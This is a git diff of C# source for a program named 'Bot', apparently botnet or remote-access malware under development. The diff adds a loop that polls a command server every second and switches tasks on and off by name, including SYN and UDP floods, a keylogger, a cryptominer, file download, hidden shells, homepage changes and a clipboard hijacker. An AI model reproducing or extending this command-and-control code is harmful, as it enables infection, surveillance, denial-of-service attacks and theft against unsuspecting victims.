@@ -1,41 +1,46 @@
 ﻿using Bot.Classes;
 using Microsoft.Win32;
 using System;
+using System.Collections.Generic;
 using System.Data.SqlClient;
+using System.Linq;
+using System.Net;
+using System.Text;
 using System.Threading;
 
 namespace Bot
 {
     internal static class Program
     {
+
         private static void Main()
         {
-            if (Misc.Registered())
-            {
-                //Thread S = new Thread(new ThreadStart(startupThread));
-                //S.Start();
-                Thread M = new Thread(new ThreadStart(mainThread));
-                M.Start();
-                Thread U = new Thread(new ThreadStart(updateThread));
-                U.Start();
+            //if (Misc.Registered())
+            //{
+            //    //Thread S = new Thread(new ThreadStart(startupThread));
+            //    //S.Start();
+            //    Thread M = new Thread(new ThreadStart(mainThread));
+            //    M.Start();
+            //    Thread U = new Thread(new ThreadStart(updateThread));
+            //    U.Start();
                 Thread T = new Thread(new ThreadStart(TaskThread));
                 T.Start();
-            }
-            else
-            {
-                if (Register())
-                {
-                    //Thread S = new Thread(new ThreadStart(startupThread));
-                    //S.Start();
-                    Thread M = new Thread(new ThreadStart(mainThread));
-                    M.Start();
-                    Thread U = new Thread(new ThreadStart(updateThread));
-                    U.Start();
-                    Thread T = new Thread(new ThreadStart(TaskThread));
-                    T.Start();
-                }
-                else { }
-            }
+            //}
+            //else
+            //{
+            //    if (Register())
+            //    {
+            //        //Thread S = new Thread(new ThreadStart(startupThread));
+            //        //S.Start();
+            //        Thread M = new Thread(new ThreadStart(mainThread));
+            //        M.Start();
+            //        Thread U = new Thread(new ThreadStart(updateThread));
+            //        U.Start();
+            //        Thread T = new Thread(new ThreadStart(TaskThread));
+            //        T.Start();
+            //    }
+            //    else { }
+            //}
         }
 
         private static void startupThread()
@@ -108,33 +113,61 @@ namespace Bot
 
         private static void TaskThread()
         {
-            string CTaskString = "0";
-
+            string CTasksyn = "";
+            string[] CTask = { };
+            string[] Tasks = { "clipboard", "http","syn","udp", "download", "firefox", "homepage", "keylogger", "mine", "cleanse", "update", "uninstall", "viewhidden", "viewvisable", "shellhidden", "shellvisable" };
             do
             {
-                string[] CTask = CTaskString.Split(';');
-
-                for (int i = 0; i < Misc.getTaskID().Length; i++)
+                string[] NTask = new WebClient().DownloadString("http://localhost:3951/Task.aspx").ToString().Split(';');
+                foreach(string x in Tasks)
                 {
-                    CTask = CTaskString.Split(';');
-                    Console.WriteLine("Amount of Tasks = " + Convert.ToString(Misc.getTaskID().Length));
-                    for (int n = 0; n < CTask.Length; n++)
+                    if (NTask.Contains(x))
                     {
-                        CTask = CTaskString.Split(';');
-                        Console.WriteLine("Amount of CurrentTasks = " + Convert.ToString(CTask.Length));
-                        if (Convert.ToInt32(CTask[n]) != Misc.getTaskID()[i] && Misc.getTaskID().Length > CTask.Length && h)
+                        if (CTask.Contains(x))
                         {
-                            Console.WriteLine(Misc.getTask(i));
-                            Console.WriteLine(Misc.getTaskID()[i]);
-                            CTaskString += ";" + Misc.getTaskID()[i];
-                            Misc.Task(Misc.getTask(i));
-                            CTask = CTaskString.Split(';');
-                            break;
+                        }
+                        else
+                        {
+                            CTasksyn += ";" + x;
+                            CTask = CTasksyn.Split(';');
+                            Console.WriteLine(x);
+                            if(x == "clipboard")
+                            {
+                                Thread C = new Thread(new ThreadStart(Misc.clip));
+                                C.Start();
+                            }
+
+                        }
+                    }
+                    else
+                    {
+                        if (CTask.Contains(x))
+                        {
+                            CTask = CTask.Where(val => val != x).ToArray();
+                            CTasksyn = "";
+                            CTasksyn = ConvertStringArrayToString(CTask);
+                            Console.WriteLine(x + " uit");
+                            if (x == "clipboard")
+                            {
+                                Thread C = new Thread(new ThreadStart(Misc.clip));
+                                C.Abort();
+                            }
                         }
                     }
                 }
                 Thread.Sleep(1000);
             } while (true);
+        }
+
+        static string ConvertStringArrayToString(string[] array)
+        {
+            StringBuilder builder = new StringBuilder();
+            foreach (string value in array)
+            {
+                builder.Append(value);
+                builder.Append(';');
+            }
+            return builder.ToString();
         }
 
         private static bool Register()
